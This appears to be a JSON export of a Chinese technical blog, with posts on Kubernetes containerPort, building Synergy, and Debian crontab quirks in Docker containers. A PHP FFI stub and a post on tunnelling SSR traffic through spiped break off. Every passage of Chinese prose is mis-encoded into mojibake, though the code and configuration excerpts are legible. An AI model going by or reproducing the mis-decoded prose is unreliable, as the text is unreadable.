{"meta":{"title":"é—²è°ˆ","subtitle":null,"description":null,"author":"ushell","url":"https://ushell.me","root":"/"},"pages":[{"title":"about","date":"2020-12-14T05:59:36.000Z","updated":"2020-12-14T05:59:36.000Z","comments":true,"path":"about/index.html","permalink":"https://ushell.me/about/index.html","excerpt":"","text":""}],"posts":[{"title":"k8så®¹å™¨å‚æ•°containerPortè§£æ","slug":"k8så®¹å™¨å‚æ•°containerPortè§£æ","date":"2021-03-31T15:33:22.000Z","updated":"2021-03-31T15:33:22.000Z","comments":true,"path":"2021/03/31/k8så®¹å™¨å‚æ•°containerPortè§£æ/","link":"","permalink":"https://ushell.me/2021/03/31/k8s%E5%AE%B9%E5%99%A8%E5%8F%82%E6%95%B0containerPort%E8%A7%A3%E6%9E%90/","excerpt":"","text":"0x1ã€èƒŒæ™¯åœ¨æ¢³ç†çº¿ä¸Šä¸šåŠ¡è¿‡ç¨‹å‘ç°ï¼ŒPodçš„é…ç½®æ–‡ä»¶ä¸­containerPortå‚æ•°é…ç½®é”™è¯¯ä¹Ÿèƒ½æ­£å¸¸é€šä¿¡ï¼›åœ¨æ¥è§¦k8sæ—¶é—´é‡Œä¸€ç›´ä»¥ä¸ºcontainerPortå‚æ•°å¿…é¡»è®¾ç½®æ‰èƒ½ä½¿å®¹å™¨å†…æœåŠ¡è¢«å¤–éƒ¨è®¿é—®ï¼Œé€šè¿‡ä¸€ç³»åˆ—å®éªŒå‘ç°containerPortè¿™ä¸ªå‚æ•°æœ‰äº›é¸¡è‚‹ã€‚ å®˜æ–¹è§£é‡ŠcontainerPortå‚æ•°: 12345List of ports to expose from the container. Exposing a port here gives the system additional information about the network connections a container uses, but is primarily informational.Not specifying a port here DOES NOT prevent that port from being exposed.Any port which is listening on the default &quot;0.0.0.0&quot; address inside a container will be accessible from the network. Cannot be updated. æ ¹æ®æ–‡æ¡£æè¿°å¯ä»¥çœ‹å‡ºcontainerPortå‚æ•°æ˜¯ç”¨æ¥æš´éœ²å®¹å™¨ç«¯å£æœåŠ¡ï¼Œä½†åé¢æè¿°å‡¡æ˜¯ç›‘å¬0.0.0.0åœ°å€çš„ç«¯å£éƒ½å¯ä»¥è¢«è®¿é—®å³ä½¿æ²¡æœ‰è®¾ç½®containerPortå‚æ•° 0x2ã€éªŒè¯ä¸ºäº†éªŒè¯æ–‡æ¡£çš„æ­£ç¡®æ€§ï¼Œé€šè¿‡é…ç½®k8sçš„v1.20ç‰ˆæœ¬ç¯å¢ƒæµ‹è¯•ä¸€ä¸‹ï¼›è¿™é‡Œé‡‡ç”¨redisè®¾è®¡å®éªŒåœºæ™¯ åœºæ™¯ä¸€ é…ç½®redis serverçš„ç›‘å¬åœ°å€ä¸º0.0.0.0 Podæ–‡ä»¶ä¸ä½¿ç”¨containerPortå‚æ•° redis-serveré…ç½®ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546apiVersion: v1kind: Servicemetadata: name: redisspec: ports: - name: tcp port: 6379 selector: component: redis-server type: ClusterIP---apiVersion: v1data: redis.conf: | bind 0.0.0.0 port 6379kind: ConfigMapmetadata: name: redis---apiVersion: apps/v1kind: Deploymentmetadata: name: &amp;name redis-serverspec: replicas: 1 selector: matchLabels: component: *name template: metadata: labels: component: *name spec: containers: - command: [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;redis-server /conf/redis.conf&#x27;] image: redis:6.0 name: *name volumeMounts: - mountPath: /conf name: config volumes: - name: config configMap: name: redis åœºæ™¯äºŒ é…ç½®redis serverçš„ç›‘å¬åœ°å€ä¸º127.0.0.1 Podæ–‡ä»¶ä½¿ç”¨containerPortå‚æ•° æ ¹æ®å®éªŒæ“ä½œç»“æœï¼Œåœºæ™¯ä¸€æ˜¯å¯ä»¥è¢«è®¿é—®ï¼ŒéªŒè¯äº†æ–‡æ¡£ä¸­æè¿°ç›‘å¬0.0.0.0æ¨¡å¼ä¸‹ä¸å—containerPorté…ç½®é™åˆ¶; åœºæ™¯äºŒä¸­æ˜¯ä¸èƒ½è¢«è®¿é—®ï¼Œå³ä½¿é…ç½®äº†containerPortå‚æ•°ã€‚ é€šè¿‡ä¸Šè¿°ç®€å•å®éªŒéªŒè¯ï¼ŒcontainerPortåŠŸèƒ½åœ¨å®é™…ä¸šåŠ¡ä¸­æ¯”è¾ƒé¸¡è‚‹ï¼›k8sç½‘ç»œç»„ä»¶æ¯”è¾ƒå¤æ‚ï¼Œåç»­è¡¥ä¸Šç›¸å…³é€»è¾‘å®ç°éƒ¨åˆ†â€¦ 0x3ã€å‚è€ƒ containerå®˜æ–¹APIæ–‡æ¡£ kubernetes Portä»‹ç»","categories":[{"name":"kubernetes","slug":"kubernetes","permalink":"https://ushell.me/categories/kubernetes/"}],"tags":[{"name":"kubernetes","slug":"kubernetes","permalink":"https://ushell.me/tags/kubernetes/"}]},{"title":"synergyå¤šä¸»æœºå…±äº«é”®é¼ ","slug":"synergyå¤šä¸»æœºå…±äº«é”®é¼ ","date":"2021-01-17T07:36:12.000Z","updated":"2021-01-17T07:36:12.000Z","comments":true,"path":"2021/01/17/synergyå¤šä¸»æœºå…±äº«é”®é¼ /","link":"","permalink":"https://ushell.me/2021/01/17/synergy%E5%A4%9A%E4%B8%BB%E6%9C%BA%E5%85%B1%E4%BA%AB%E9%94%AE%E9%BC%A0/","excerpt":"","text":"èƒŒæ™¯å®¶é‡Œæœ‰å°ç ´æ—§çš„ç¬”è®°æœ¬ï¼Œä¸ºäº†è®©å®ƒç»§ç»­å‘å…‰å‘çƒ­ï¼Œæ‰“ç®—å®‰è£…Debianç³»ç»Ÿé…ç½®å¼€å‘ç¯å¢ƒï¼›åå¹´å‰çš„ç¬”è®°æœ¬æ”¹è£…åä¾ç„¶å¯ä»¥å¼€å‘è¯¸å¦‚PHPæˆ–pythonä¹‹ç±»ä¸éœ€è¦ç¼–è¯‘çš„é¡¹ç›®ã€‚ç¬”è€…çš„å·¥ä½œæœ¬æ˜¯mbp, ä¸¤å°ç¬”è®°æœ¬å¼€å‘æ—¶æ€»æ˜¯æ¥å›åˆ‡æ¢é¼ æ ‡é”®ç›˜æ¯”è¾ƒéº»çƒ¦ï¼Œå› æ­¤éœ€è¦é€šè¿‡mbpæ“ä½œæ—§ç‰ˆç¬”è®°æœ¬ã€‚ synergyæ˜¯ä¸€ä¸ªè·¨å¹³å°è½¯ä»¶ï¼Œå¯ä»¥é€šè¿‡ä¸€å¥—é”®é¼ æ“ä½œå¤šä¸ªä¸åŒç³»ç»Ÿä¸»æœºçš„è½¯ä»¶ï¼›åŒç±»å‹çš„è¿˜æœ‰å¾®è½¯æ¨å‡ºçš„æ— ç•Œè½¯ä»¶ï¼Œä¸è¿‡è¯¥è½¯ä»¶ä»…é™Windowså¹³å°æ“ä½œã€‚ synergyåˆ†ä¸ºæ”¶è´¹ç‰ˆå’Œå¼€æºç‰ˆæœ¬ï¼Œå¼€æºç‰ˆæœ¬æ˜¯å‘½ä»¤è¡Œæ“ä½œï¼ˆæ— GUIï¼‰ï¼Œæ»¡è¶³åŸºæœ¬æ“ä½œã€‚ æ„å»º ä¸‹è½½æºç  12345git clone https://github.com/symless/synergy-core.gitcd synergy-coregit checkout v2.0.0-stable é…ç½®ç¼–è¯‘(MacOS) 123456789101112131415161718192021// ä¾èµ–qt, å¦‚æœæ²¡æœ‰å®‰è£…å¯ä»¥brew install qt// æŸ¥çœ‹qtå®‰è£…ç›®å½•brew info qt // è®¾ç½®Cmakeç¯å¢ƒå˜é‡export CMAKE_PREFIX_PATH=&quot;/usr/local/Cellar/qt/5.15.0/Frameworks/&quot;// è®¾ç½®æ„å»ºmakeæ–‡ä»¶ç›®å½•mkdir build &amp;&amp; cd build// æ³¨æ„big surç‰ˆæœ¬çš„sdkç‰ˆæœ¬æ˜¯11.0.sdkcmake -DCMAKE_OSX_SYSROOT=/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX11.0.sdk -DCMAKE_OSX_DEPLOYMENT_TARGET=11.0 -DCMAKE_OSX_ARCHITECTURES=x86_64 ..// ç¼–è¯‘make// makeæˆåŠŸåç”Ÿæˆä¸‰ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå…¶ä¸­synergy-coreæ˜¯æ ¸å¿ƒæ–‡ä»¶ï¼Œå…¶ä»–ä¸¤ä¸ªæ˜¯æ—§ç‰ˆæœ¬ç¨‹åºsynergy-core synergycsynergys é…ç½®ç¼–è¯‘(Debian) 12345678git clone https://github.com/symless/synergy-core.gitcd synergy-coregit checkout v2.0.0-stablemkdir build// Debian8ç‰ˆæœ¬çš„cmakeéœ€è¦å‡çº§cmake ..make synergyé…ç½®ç¤ºä¾‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// server.conf// é…ç½®å‚è€ƒ: https://github.com/symless/synergy-core/wiki/Text-Config# sample synergy configuration file## comments begin with the # character and continue to the end of# line. comments may appear anywhere the syntax permits.# +----------+ +---------+ +---------+# | mac-mini | | macbook | | windows |# | | | | | |# +----------+ +---------+ +---------+section: screens # three hosts named: mac-mini, macbook, and windows # These are the nice names of the hosts to make it easy to write the config file # The aliases section below contain the &quot;actual&quot; names of the hosts (their hostnames) debian: macbook: windows:endsection: links # windows is to the right of macbook # mac-mini is to the left of macbook macbook: right(0,100) = windows # the numbers in parentheses indicate the percentage of the screen&#x27;s edge to be considered active for switching) left = debian # shift = shift (shift, alt, super, meta can be mapped to any of the others) # macbook is to the right of mac-mini debian: right = macbook # macbook is to the left of windows windows: left = macbookendsection: aliases # The &quot;real&quot; name of windows is John-Smiths-windows-3.local. # If we wanted we could remove this alias and instead use John-Smiths-windows-3.local everywhere windows is above. # Hopefully it should be easy to see why using an alias is nicer macbook: mbp debian: debian.localendsection: options switchDelay = 400 # é¼ æ ‡æ»‘åˆ°è¾¹ç¼˜æ—¶ï¼Œæç•™å¤šä¹…æ‰èƒ½åˆ‡æ¢å±å¹• clipboardSharing = true # å…±äº«å‰ªåˆ‡æ¿end è¿è¡Œç¬”è€…é‡‡ç”¨mbpä½œä¸ºæœåŠ¡ç«¯æ§åˆ¶Debianç³»ç»Ÿæ“ä½œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯macç¯å¢ƒè¿è¡Œè½¯ä»¶éœ€è¦è®¾ç½®ç»™itermé…ç½®æƒé™(itermç»ˆç«¯æ‰§è¡Œsynergy) æœªé…ç½®æƒé™æŠ¥é”™: 1error failed to create quartz event tap macç¯å¢ƒæƒé™é…ç½®: ç³»ç»Ÿåå¥½è®¾ç½® -&gt; å®‰å…¨æ€§ä¸éšç§ -&gt; è¾…åŠ©åŠŸèƒ½ -&gt; iterm.appå…è®¸ æœåŠ¡ç«¯(mbp)12// addresså‚æ•°ä»£è¡¨æœåŠ¡ç«¯ä¸»æœºIPåœ°å€sudo ./synergy-core --server --address 192.168.1.100 --no-daemon --name macbook --config ./server.conf å®¢æˆ·ç«¯(Debian)1sudo ./synergy-core --client --no-daemon --name debian 192.168.1.100 æ“ä½œæ“ä½œmbpçš„è§¦æ‘¸æ¿ç§»åŠ¨åˆ°å±å¹•å¤–æ—¶ä¼šè¿›å…¥åˆ°Debianç³»ç»Ÿå±å¹•ä¸­ï¼ŒåŒä¸€å±€åŸŸç½‘ä¸­æ“ä½œæµç•…ï¼Œæ²¡æœ‰å¡é¡¿ç°è±¡ã€‚ å¦‚æœDebianä¸ºserverç«¯æ“ä½œmbpæ—¶ä¼šå¯¼è‡´é¼ æ ‡ç§»åŠ¨åˆ°mbpå±å¹•æ—¶ç‚¹å‡»æ— æ•ˆæƒ…å†µã€‚ å‚è€ƒ1ã€[Synergy-coreç¼–è¯‘ä½¿ç”¨æ•™ç¨‹] https://segmentfault.com/a/1190000023512582 2ã€[synergyæ–‡æ¡£] https://github.com/symless/synergy-core/wiki/Compiling 3ã€[cmakeå®˜ç½‘] https://cmake.org/download/","categories":[{"name":"tools","slug":"tools","permalink":"https://ushell.me/categories/tools/"}],"tags":[{"name":"synergy","slug":"synergy","permalink":"https://ushell.me/tags/synergy/"},{"name":"å…±äº«é”®é¼ ","slug":"å…±äº«é”®é¼ ","permalink":"https://ushell.me/tags/%E5%85%B1%E4%BA%AB%E9%94%AE%E9%BC%A0/"}]},{"title":"Dockerç¯å¢ƒä¹‹Crontabè¸©å‘","slug":"Dockerç¯å¢ƒä¹‹Crontabè¸©å‘","date":"2020-03-24T16:00:00.000Z","updated":"2020-03-24T16:00:00.000Z","comments":true,"path":"2020/03/25/Dockerç¯å¢ƒä¹‹Crontabè¸©å‘/","link":"","permalink":"https://ushell.me/2020/03/25/Docker%E7%8E%AF%E5%A2%83%E4%B9%8BCrontab%E8%B8%A9%E5%9D%91/","excerpt":"","text":"0x1.èƒŒæ™¯ä¸šåŠ¡ä¸­é‡åˆ°Pythoné•œåƒä½¿ç”¨crontabæ‰§è¡Œä»»åŠ¡ä¸æ‰§è¡Œçš„æƒ…å†µï¼Œé€šè¿‡ä¸€ç³»åˆ—å®šä½åˆ†æåå‘ç°crontabåœ¨å¤„ç†ç¯å¢ƒå˜é‡å’Œcrontabä»»åŠ¡æ–‡ä»¶è§£æå­˜åœ¨é—®é¢˜ã€‚ ç¯å¢ƒ é•œåƒ: Python:3.7.5 Crontabç‰ˆæœ¬: 3.0pl1-127+deb8u2 crontabä»»åŠ¡æ–‡ä»¶ 1* * * * * /usr/local/bin/python job.py &gt;&gt; /tmp/job.log 2&gt;&amp;1 0x2.ç¯å¢ƒå˜é‡pythonç¨‹åºæ‰§è¡Œæ—¶é‡‡ç”¨os.environè¯»å–ç¯å¢ƒå˜é‡ï¼Œåœ¨è°ƒè¯•ç¨‹åºæ—¶å‘ç°dockeré•œåƒæ‰“åŒ…è¿è¡Œåï¼Œç¨‹åºæŠ¥é”™æ— æ³•è¯»å–ç¯å¢ƒå˜é‡å€¼ã€‚ç™»é™†åˆ°k8sç¯å¢ƒä¸­æ‰‹åŠ¨æ‰§è¡Œenvå‘½ä»¤å‘ç°æ˜¯å¯ä»¥è·å–æ³¨å…¥çš„ç¯å¢ƒå˜é‡ï¼Œä¿®æ”¹pythonæ–‡ä»¶æ‰“å°envç¯å¢ƒä¿¡æ¯ 1environ(&#123;&#x27;HOME&#x27;: &#x27;/root&#x27;, &#x27;LOGNAME&#x27;: &#x27;root&#x27;, &#x27;PATH&#x27;: &#x27;/usr/bin:/bin&#x27;, &#x27;SHELL&#x27;: &#x27;/bin/sh&#x27;, &#x27;PWD&#x27;: &#x27;/root&#x27;, &#x27;LC_CTYPE&#x27;: &#x27;C.UTF-8&#x27;&#125;) ä¸Šè¿°ç¯å¢ƒæ˜¯åŸºç¡€çš„ç¯å¢ƒå˜é‡ä¿¡æ¯ï¼Œpythonç¨‹åºæ— æ³•åœ¨æ‰§è¡Œç¯å¢ƒè·å–æ–°å¢çš„ç¯å¢ƒå˜é‡ã€‚åœ¨æŸ¥æ‰¾èµ„æ–™è¿‡ç¨‹ä¸­å‘ç°crontabå®ˆæŠ¤è¿›ç¨‹ä¼šä»/etc/environmentå’Œ/etc/default/localeè·å–ç¯å¢ƒå˜é‡ã€‚åœ¨Debianç¯å¢ƒä¸­é‡‡ç”¨serviceçš„æ–¹å¼è¿è¡Œ/usr/sbin/cron, å®šä½å¯¹åº”çš„æ‰§è¡Œè„šæœ¬ 12345678910111213141516171819202122232425262728293031#cat /etc/init.d/cron...parse_environment ()&#123; for ENV_FILE in /etc/environment /etc/default/locale; do [ -r &quot;$ENV_FILE&quot; ] || continue [ -s &quot;$ENV_FILE&quot; ] || continue for var in LANG LANGUAGE LC_ALL LC_CTYPE; do value=`egrep &quot;^$&#123;var&#125;=&quot; &quot;$ENV_FILE&quot; | tail -n1 | cut -d= -f2` [ -n &quot;$value&quot; ] &amp;&amp; eval export $var=$value if [ -n &quot;$value&quot; ] &amp;&amp; [ &quot;$ENV_FILE&quot; = /etc/environment ]; then log_warning_msg &quot;/etc/environment has been deprecated for locale information; use /etc/default/locale for $var=$value instead&quot; fi done done# Get the timezone set. if [ -z &quot;$TZ&quot; -a -e /etc/timezone ]; then TZ=`cat /etc/timezone` fi&#125;# Parse the system&#x27;s environmentif [ &quot;$READ_ENV&quot; = &quot;yes&quot; ] ; then parse_environmentfi... shellè„šæœ¬é‡‡ç”¨åŠ è½½environmentå’Œlocaleæ–‡ä»¶å°†ç¯å¢ƒå˜é‡æ³¨å…¥åˆ°å½“å‰è¿›ç¨‹ç¯å¢ƒä¸­ï¼Œæ ¹æ®crontabåœ¨bug#543895æè¿°æ¨èä½¿ç”¨localeæ–‡ä»¶ã€‚ ç»è¿‡ä¸Šè¿°åˆ†æï¼Œéœ€è¦è°ƒæ•´Dockerfileç›¸å…³æ–‡ä»¶æ“ä½œï¼›è¿™é‡Œé‡‡ç”¨entrypoint.shæ–‡ä»¶æ³¨å…¥ç¯å¢ƒå˜é‡ 1env &gt;&gt; /etc/default/locale 0x3.ä»»åŠ¡è§£æä¸æƒé™crontabä»»åŠ¡åˆ›å»ºæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ç›´æ¥ä½¿ç”¨crontabå‘½ä»¤æ‰‹åŠ¨ç¼–è¾‘å†™å…¥ï¼Œå¦ä¸€ç§æ˜¯å°†å†™å¥½çš„ä»»åŠ¡æ–‡ä»¶å¤åˆ¶åˆ°/var/spool/cron/crontabsç›®å½•ä¸­ã€‚ æ’æŸ¥æŸä¸ªä¸šåŠ¡é—®é¢˜æ—¶ï¼Œå‘ç°crontabä»»åŠ¡ä¸èƒ½æ‰§è¡Œï¼ˆé‡‡ç”¨æ–‡ä»¶å¤åˆ¶å½¢å¼ï¼‰ï¼›è¿›å…¥PODå®¹å™¨ä¸­ä½¿ç”¨catå‘½ä»¤æŸ¥çœ‹ä»»åŠ¡æ–‡ä»¶ä¹Ÿæ˜¯æ˜¾ç¤ºæ­£å¸¸ï¼Œä½†æ˜¯ä»»åŠ¡è¿˜æ˜¯ä¸èƒ½æ‰§è¡Œã€‚åæ¥é€šè¿‡crontabæŸ¥çœ‹ä¿å­˜åï¼Œä»»åŠ¡èƒ½æ­£å¸¸æ‰§è¡Œã€‚ å›æº¯ä¸¤æ¬¡æ“ä½œæ—¶ï¼Œå‘ç°ä¸¤ä¸ªæœ‰æ„æ€çš„é—®é¢˜ã€‚é—®é¢˜ä¸€æ˜¯crontabå‘½ä»¤ç¼–è¾‘ä»»åŠ¡æ–‡ä»¶ä¿å­˜åï¼Œè¯¥ä»»åŠ¡æ–‡ä»¶çš„ç»„æƒé™å˜æˆroot:crontab(åŸroot:root);é—®é¢˜äºŒæ˜¯crontabå‘½ä»¤ç¼–è¾‘æŸ¥çœ‹æ–‡ä»¶åç›´æ¥ä¿å­˜ï¼Œæ–‡ä»¶å¤§å°å‘ç”Ÿæ”¹å˜ï¼Œæ­¤è¿‡ç¨‹æ— äººä¸ºæ›´æ”¹å†…å®¹ã€‚ é—®é¢˜ä¸€çš„å‡ºç°æ˜¯å› ä¸ºcrontabå‘½ä»¤ç¼–è¾‘æ–‡ä»¶æ—¶ä¼šè®¾ç½®ä»»åŠ¡æ–‡ä»¶çš„ç»„ï¼ŒDebiané•œåƒç¯å¢ƒä¸­åªæœ‰rootç”¨æˆ·ï¼Œç”¨æˆ·ç»„åˆ—è¡¨ä¸­æ˜¯å­˜åœ¨crontabç»„ã€‚ç”±äºDockerç¯å¢ƒä¸­åªæœ‰rootç”¨æˆ·æ‰§è¡Œï¼Œä¸éœ€è¦è°ƒæ•´ä»»åŠ¡æ–‡ä»¶çš„æƒé™ï¼›ä½†éDockerç¯å¢ƒä¸­ï¼Œcrontabçš„ä»»åŠ¡æ–‡ä»¶ä¸€èˆ¬è®¾ç½®600æƒé™å±…å¤šï¼›cronå®ˆæŠ¤è¿›ç¨‹è¯»å–æ–‡ä»¶æ—¶ä¼šæ ¡éªŒæƒé™ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#https://github.com/ushell/learncode/blob/master/crontab/debian/cron-3.0pl1/database.c#L206.../*ä»»åŠ¡æ–‡ä»¶æƒé™æ ¡éªŒ*/if (strcmp(fname, &quot;*system*&quot;) &amp;&amp; !(pw = getpwnam(uname))) &#123;/* file doesn&#x27;t have a user in passwd file. */log_it(fname, getpid(), &quot;ORPHAN&quot;, &quot;no passwd entry&quot;);goto next_crontab;&#125;if ((crontab_fd = open(tabname, O_RDONLY, 0)) &lt; OK) &#123;/* crontab not accessible? */log_it(fname, getpid(), &quot;CAN&#x27;T OPEN&quot;, tabname);goto next_crontab;&#125;if (fstat(crontab_fd, statbuf) &lt; OK) &#123;log_it(fname, getpid(), &quot;FSTAT FAILED&quot;, tabname);goto next_crontab;&#125;/*æŸ¥è¯¢/etc/passwdæ–‡ä»¶ä¸­ç”¨æˆ·*/u = find_user(old_db, fname);if (u != NULL) &#123; /* if crontab has not changed since we last read it * in, then we can just use our existing entry. */ if (u-&gt;mtime == statbuf-&gt;st_mtime) &#123; Debug(DLOAD, (&quot; [no change, using old data]&quot;)) unlink_user(old_db, u); link_user(new_db, u); goto next_crontab; &#125; /* before we fall through to the code that will reload * the user, let&#x27;s deallocate and unlink the user in * the old database. This is more a point of memory * efficiency than anything else, since all leftover * users will be deleted from the old database when * we finish with the crontab... */ Debug(DLOAD, (&quot; [delete old data]&quot;)) unlink_user(old_db, u); free_user(u); log_it(fname, getpid(), &quot;RELOAD&quot;, tabname);&#125;... é—®é¢˜äºŒçš„å‡ºç°æ¯”è¾ƒè¯¡å¼‚ï¼Œæ–‡ä»¶å¤§å°å˜åŒ–ä½†catæŸ¥çœ‹æ–‡ä»¶å†…å®¹æ²¡æœ‰æ˜æ˜¾å˜åŒ–ã€‚é€šè¿‡xxdå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶æ”¹åŠ¨å‰åçš„åå…­è¿›åˆ¶ä¿¡æ¯ crontabæ”¹åŠ¨å‰ 123400000000: 3020 3020 2a20 2a20 2a20 2f75 7372 2f6c 0 0 * * * /usr/l00000010: 6f63 616c 2f62 696e 2f70 7974 686f 6e20 ocal/bin/python//çœç•¥...000000f0: 2e6c 6f67 2032 3e26 31 .log 2&gt;&amp;1 crontabæ”¹åŠ¨å 123400000000: 3020 3020 2a20 2a20 2a20 2f75 7372 2f6c 0 0 * * * /usr/l00000010: 6f63 616c 2f62 696e 2f70 7974 686f 6e20 ocal/bin/python//çœç•¥...000000f0: 2e6c 6f67 2032 3e26 310a .log 2&gt;&amp;1. æ³¨æ„åˆ°æ–‡ä»¶ç»“å°¾å¤„çš„åŒºåˆ«ï¼Œæ”¹åŠ¨åå¤šäº†0x0aæ ‡å¿—ä¿¡æ¯å³æ–‡ä»¶æ¢è¡Œç¬¦LFã€‚ç”±äºä»»åŠ¡æ–‡ä»¶æœ€åä¸€è¡Œæ²¡æœ‰æ¢è¡Œç¬¦å·å¯¼è‡´ä¸èƒ½åŠ è½½è¯¥æ¡å‘½ä»¤ã€‚ 12345678910111213141516171819202122232425262728//https://github.com/ushell/learncode/blob/master/crontab/debian/cron-3.0pl1/misc.c#L329/* get_string(str, max, file, termstr) : like fgets() but * (1) has terminator string which should include \\n * (2) will always leave room for the null * (3) uses get_char() so LineNumber will be accurate * (4) returns EOF or terminating character, whichever */intget_string(string, size, file, terms) char *string; int size; FILE *file; char *terms;&#123; int ch; while (EOF != (ch = get_char(file)) &amp;&amp; !strchr(terms, ch)) &#123; if (size &gt; 1) &#123; *string++ = (char) ch; size--; &#125; &#125; if (size &gt; 0) *string = &#x27;\\0&#x27;; return ch;&#125; 0x4.æ‰‹å·¥è°ƒè¯•åŸºäºDebianç³»ç»Ÿçš„crontabæ²¡æœ‰æ—¥å¿—è®°å½•ï¼Œè°ƒè¯•ä»£ç æ—¶éœ€è¦æ‰“å¼€ cron.hæ–‡ä»¶ä¸­DEBUGGINGï¼›é‡æ–°ç¼–è¯‘åï¼Œcrontabæ‰§è¡Œæ—¶ä¼šæ‰“å°ä¸€äº›å…³é”®çš„DEBUGä¿¡æ¯æ–¹ä¾¿æ’æŸ¥ã€‚ æ³¨æ„ç¼–è¯‘åå‚æ•°-xçš„å€¼é—®é¢˜ 12#ç¤ºä¾‹./cron -x ext,proc,pars,load #å‚è€ƒcron.hä¸­çš„DebugFlags 0x5.æ€»ç»“crontabæ˜¯Linuxç¯å¢ƒä¸­æœ€å¸¸ç”¨çš„å®šæ—¶ä»»åŠ¡æ‰§è¡Œç¨‹åºï¼Œç”±äºæ“ä½œç³»ç»Ÿä¸åŒcrontabçš„å®ç°æ–¹å¼ä¹Ÿä¸ä¸€æ ·ã€‚åœ¨Dockerç¯å¢ƒä¸­ï¼ŒåŸºäºDebianç³»ç»Ÿä½¿ç”¨çš„æ˜¯3.0pl1-127ç‰ˆæœ¬ï¼ŒAlpineç³»ç»Ÿä¸­ä½¿ç”¨çš„busyboxç‰ˆæœ¬ã€‚å‰è€…ç¨‹åºæ¯”è¾ƒå®Œå–„ä½†æ˜¯ä¸æ”¯æŒæ—¥å¿—è®°å½•(éœ€è¦ä¿®æ”¹æºç ), åè€…æ¯”è¾ƒè½»é‡çº§æ”¯æŒå‰åå°åŠæ—¥å¿—è®°å½•ç­‰åŠŸèƒ½ã€‚ ç”±äºcrontabæœ€æ–°ä¸€ç‰ˆçš„æ›´æ–°æ˜¯2004å¹´å·¦å³ï¼ŒDebianç³»ç»Ÿæ‰“ç®—é‡‡ç”¨cronieä»£æ›¿ç›®å‰crontabã€‚ä¸šåŠ¡ç³»ç»Ÿä¸­å¯ä»¥æ ¹æ®å…¶ä»–ç‰ˆæœ¬çš„å®šæ—¶ç¨‹åºä»£æ›¿ã€‚ å‚è€ƒ bug#543895 DebianCronWiki LocaleWiki crontabåŸç†åˆ†æ","categories":[{"name":"docker","slug":"docker","permalink":"https://ushell.me/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://ushell.me/tags/docker/"},{"name":"crontab","slug":"crontab","permalink":"https://ushell.me/tags/crontab/"},{"name":"debian","slug":"debian","permalink":"https://ushell.me/tags/debian/"}]},{"title":"PHP7.4çš„æ–°åŠŸèƒ½FFI","slug":"php7-4çš„æ–°åŠŸèƒ½FFI","date":"2019-12-10T16:00:00.000Z","updated":"2019-12-10T16:00:00.000Z","comments":true,"path":"2019/12/11/php7-4çš„æ–°åŠŸèƒ½FFI/","link":"","permalink":"https://ushell.me/2019/12/11/php7-4%E7%9A%84%E6%96%B0%E5%8A%9F%E8%83%BDFFI/","excerpt":"","text":"PHPåœ¨7.4ç‰ˆæœ¬æä¾›ä¸€ä¸ªæœ‰æ„æ€çš„æ‰©å±•FFI(Foreign Function Interface)ï¼Œä½¿PHPå¯ä»¥è°ƒç”¨Cè¯­è¨€çš„å‡½æ•°ï¼Œè¯¥æ‰©å±•ç”±PHPæ ¸å¿ƒå¼€å‘è€…Dmitry Stogovå¼€å‘ã€‚å…¶å®è·¨è¯­è¨€è°ƒç”¨å·²ç»å¾ˆå¸¸è§çš„éœ€æ±‚ï¼Œè™½ç„¶çœ‹ç€æ¯”è¾ƒæ€ªå¼‚ï¼Œæ›´å¤šçš„æ˜¯ä¸€ç§æŠ˜ä¸­å®ç°wrapperã€‚FFIçš„å‡ºç°é™ä½å¯¹å¼€å‘PHPæ‰©å±•çš„ä¾èµ–ï¼Œåœ¨æ­¤ä¹‹å‰å¦‚æœè°ƒç”¨æŸäº›Cè¯­è¨€ç¼–å†™çš„åº“æ—¶ï¼Œéœ€è¦ä»¥å¼€å‘PHPæ‰©å±•å½¢å¼è¿›è¡Œå°è£…ï¼›å³ä½¿æœ‰zephirè¿™æ ·çš„å·¥å…·ï¼Œä¾ç„¶å¢åŠ å­¦ä¹ æˆæœ¬ã€‚ #ç¤ºä¾‹#ç¼ºç‚¹#æ€»ç»“#å‚è€ƒ PHP 7.4 FFI: What you need to know PHP 7.4 å‰ç»ï¼šFFI PHP FFIå®˜ç½‘æ–‡æ¡£ PHP FFIæºç  PHP FFI RFC","categories":[{"name":"php","slug":"php","permalink":"https://ushell.me/categories/php/"}],"tags":[{"name":"ffi","slug":"ffi","permalink":"https://ushell.me/tags/ffi/"}]},{"title":"SSRæµé‡åŠ å¯†","slug":"SSRæµé‡åŠ å¯†","date":"2019-09-23T16:00:00.000Z","updated":"2019-09-23T16:00:00.000Z","comments":true,"path":"2019/09/24/SSRæµé‡åŠ å¯†/","link":"","permalink":"https://ushell.me/2019/09/24/SSR%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/","excerpt":"","text":"é…¸é…¸ä¹³æµæµªåœ¨å¤–ï¼Œæ€»ä¼šæœ‰åäººåœ¨é…¸é…¸ä¹³å›å®¶çš„è·¯ä¸Šæ—¶å¸¸æ‰“åŠ«å¥¹ã€‚è‹±å‹‡çš„ä½ åº”è¯¥å¦‚ä½•ä¿æŠ¤ä½ å®¶å¯çˆ±çš„é…¸é…¸ä¹³å‘¢ï¼Ÿçºµè§‚é­”æ³•ä¸–ç•Œï¼Œæ— å¤–ä¹åŠ å¯†æˆ–æ··æ·†ã€‚æ··æ·†ç®—æ˜¯é“é«˜ä¸€å°ºï¼Œé­”é«˜ä¸€ä¸ˆï¼›è¿˜æ˜¯é­”é«˜ä¸€å°ºï¼Œé“é«˜ä¸€ä¸ˆå‘¢ï¼ŸçœŸçœŸå‡å‡å€’ä¸å¦‚æŒ–æ¡ä¸“é—¨çš„è·¯è®©é…¸é…¸ä¹³å¯ä»¥æ„‰å¿«çš„ç©è€ï¼Œè¿™é‡Œä½¿ç”¨spipedæ–¹æ¡ˆæ¥å®ç°ã€‚ spipedæ˜¯Tarsnapé¡¹ç›®ä¸­çš„ä¸€ä¸ªåŠ 